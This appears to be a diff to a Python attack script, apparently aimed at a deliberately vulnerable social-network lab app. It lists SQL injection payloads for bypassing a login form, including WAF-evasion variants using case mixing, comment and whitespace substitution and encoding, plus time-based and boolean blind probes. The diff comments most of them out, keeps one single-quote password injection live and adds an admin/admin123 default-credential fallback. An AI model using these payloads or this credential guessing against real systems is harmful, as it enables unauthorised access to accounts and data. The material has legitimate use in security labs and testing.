@@ -182,51 +182,53 @@ class AdvancedVulnerableSNSAttacker:
         
         # 기본 페이로드
         basic_payloads = [
-            ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
-            ("admin", '" or 1=1 --', 'Double quote numeric OR'),
-            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
-            ('admin" --', 'anything', 'Comment out password'),
+            # ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
+            # ("admin", '" or 1=1 --', 'Double quote numeric OR'),
+            # ('admin" or "a"="a" --', 'anything', 'Username field injection'),
+            # ('admin" --', 'anything', 'Comment out password'),
             ("admin", "' or '1'='1", 'Password field injection')
         ]
         
         # 고급 WAF 우회 페이로드
         advanced_payloads = [
-            # 대소문자 혼용
-            ("admin", '" Or 1=1 --', 'Case variation'),
-            ("admin", '" oR "1"="1" --', 'Mixed case'),
+            # # 대소문자 혼용
+            # ("admin", '" Or 1=1 --', 'Case variation'),
+            # ("admin", '" oR "1"="1" --', 'Mixed case'),
             
-            # 주석 변형
-            ("admin", '" or 1=1 #', 'Hash comment'),
-            ("admin", '" or 1=1 /*comment*/', 'Inline comment'),
-            ("admin", '" or 1=1 -- -', 'Double dash space'),
+            # # 주석 변형
+            # ("admin", '" or 1=1 #', 'Hash comment'),
+            # ("admin", '" or 1=1 /*comment*/', 'Inline comment'),
+            # ("admin", '" or 1=1 -- -', 'Double dash space'),
             
-            # 공백 대체
-            ("admin", '"/**/or/**/1=1/**/--', 'Comment as space'),
-            ("admin", '"\tor\t1=1\t--', 'Tab as space'),
-            ("admin", '"%20or%201=1%20--', 'URL encoded space'),
+            # # 공백 대체
+            # ("admin", '"/**/or/**/1=1/**/--', 'Comment as space'),
+            # ("admin", '"\tor\t1=1\t--', 'Tab as space'),
+            # ("admin", '"%20or%201=1%20--', 'URL encoded space'),
             
-            # 인코딩
-            ("admin", '" %6F%72 1=1 --', 'Partial hex encoding'),
-            ("admin", '" \u006F\u0072 1=1 --', 'Unicode encoding'),
+            # # 인코딩
+            # ("admin", '" %6F%72 1=1 --', 'Partial hex encoding'),
+            # ("admin", '" \u006F\u0072 1=1 --', 'Unicode encoding'),
             
-            # Time-based blind
-            ("admin", '" or sleep(5) --', 'Time-based blind'),
-            ("admin", '" or if(1=1,sleep(3),0) --', 'Conditional sleep'),
+            # # Time-based blind
+            # ("admin", '" or sleep(5) --', 'Time-based blind'),
+            # ("admin", '" or if(1=1,sleep(3),0) --', 'Conditional sleep'),
             
-            # Boolean-based blind
-            ("admin", '" or substring(version(),1,1)="5" --', 'Boolean blind'),
-            ("admin", '" or ascii(substring(database(),1,1))>64 --', 'ASCII based blind'),
+            # # Boolean-based blind
+            # ("admin", '" or substring(version(),1,1)="5" --', 'Boolean blind'),
+            # ("admin", '" or ascii(substring(database(),1,1))>64 --', 'ASCII based blind'),
             
-            # 특수 기법
-            ("admin", '" /*!50000or*/ 1=1 --', 'MySQL version comment'),
-            ("admin", '" or 1=1;#', 'Semicolon termination'),
-            ("admin", '" or "1"like"1" --', 'LIKE operator'),
-            ("admin", '" or 1 in (1) --', 'IN operator'),
-            ("admin", '" or 1=1 order by 1 --', 'ORDER BY injection')
+            # # 특수 기법
+            # ("admin", '" /*!50000or*/ 1=1 --', 'MySQL version comment'),
+            # ("admin", '" or 1=1;#', 'Semicolon termination'),
+            # ("admin", '" or "1"like"1" --', 'LIKE operator'),
+            # ("admin", '" or 1 in (1) --', 'IN operator'),
+            # ("admin", '" or 1=1 order by 1 --', 'ORDER BY injection')
         ]
         
         # 모든 페이로드 통합
         all_payloads = basic_payloads + advanced_payloads
+
+        all_payloads.append(("admin", "admin123", "Default credentials (fallback)"))
         
         success_count = 0
         
